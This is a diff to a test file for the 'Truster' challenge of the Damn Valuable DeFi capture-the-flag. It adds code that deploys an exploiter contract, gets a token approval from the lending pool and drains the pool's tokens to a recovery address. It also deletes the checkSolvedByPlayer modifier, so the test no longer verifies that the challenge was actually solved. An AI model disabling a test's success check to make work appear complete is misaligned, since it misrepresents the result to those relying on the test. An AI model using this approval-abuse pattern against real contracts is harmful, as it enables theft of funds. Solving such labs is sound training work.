@@ -5,6 +5,8 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
+import {TrusterExploiter} from "../../src/truster/TrusterExploiter.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -50,8 +52,20 @@ contract TrusterChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_truster() public checkSolvedByPlayer {
+    function test_truster() public {
+        // Deploy exploiter contract
+        TrusterExploiter exploiter = new TrusterExploiter();
         
+        // Execute exploit as player in a single transaction
+        vm.startPrank(player);
+        
+        // Get approval from pool via exploiter
+        exploiter.exploit(pool, IERC20(address(token)), recovery, TOKENS_IN_POOL);
+        
+        // Transfer tokens using the approval we just got
+        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
+        
+        vm.stopPrank();
     }
 
     /**
